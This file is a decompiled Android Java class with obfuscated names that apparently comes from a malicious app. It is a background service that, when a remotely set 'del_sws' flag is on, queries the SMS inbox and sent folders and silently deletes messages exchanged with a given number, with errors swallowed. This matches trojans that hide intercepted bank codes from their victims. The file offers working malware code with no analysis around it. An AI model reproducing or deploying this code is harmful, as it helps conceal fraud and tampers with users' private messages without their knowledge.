package wocwvy.czyxoxmbauu.slsa;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;

/* JADX INFO: loaded from: classes.dex */
public class whemsbk extends Service {

    /* JADX INFO: renamed from: a */
    C0020b f598a = new C0020b();

    /* JADX INFO: renamed from: c */
    private void m350c(Context context, String str, String str2) {
        try {
            Cursor cursorQuery = context.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id", "thread_id", "address", "person", "date", "body"}, null, null, null);
            if (cursorQuery == null || !cursorQuery.moveToFirst()) {
                return;
            }
            do {
                long j = cursorQuery.getLong(0);
                cursorQuery.getLong(1);
                String string = cursorQuery.getString(2);
                if (!str.equals(cursorQuery.getString(5)) && string.equals(str2)) {
                    context.getContentResolver().delete(Uri.parse("content://sms/" + j), null, null);
                }
            } while (cursorQuery.moveToNext());
        } catch (Exception unused) {
        }
    }

    /* JADX INFO: renamed from: a */
    public void m351a(Context context, String str, String str2) {
        String strM251e = this.f598a.m251e(context, "del_sws");
        this.f598a.m230a("RCWC", "" + strM251e);
        if (strM251e.contains("true")) {
            this.f598a.m259l(context);
            m350c(context, "", str);
            m352b(context, "", str);
        }
    }

    /* JADX INFO: renamed from: b */
    public void m352b(Context context, String str, String str2) {
        try {
            Cursor cursorQuery = context.getContentResolver().query(Uri.parse("content://sms/sent"), new String[]{"_id", "thread_id", "address", "person", "date", "body"}, null, null, null);
            if (cursorQuery == null || !cursorQuery.moveToFirst()) {
                return;
            }
            do {
                long j = cursorQuery.getLong(0);
                cursorQuery.getLong(1);
                String string = cursorQuery.getString(2);
                if (!str.equals(cursorQuery.getString(5)) && string.equals(str2)) {
                    context.getContentResolver().delete(Uri.parse("content://sms/" + j), null, null);
                }
            } while (cursorQuery.moveToNext());
        } catch (Exception unused) {
        }
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        try {
            m351a(this, intent.getStringExtra("num"), intent.getStringExtra("ms"));
        } catch (Exception unused) {
        }
        try {
            Thread.sleep(5000L);
            return 1;
        } catch (InterruptedException unused2) {
            return 1;
        }
    }
}
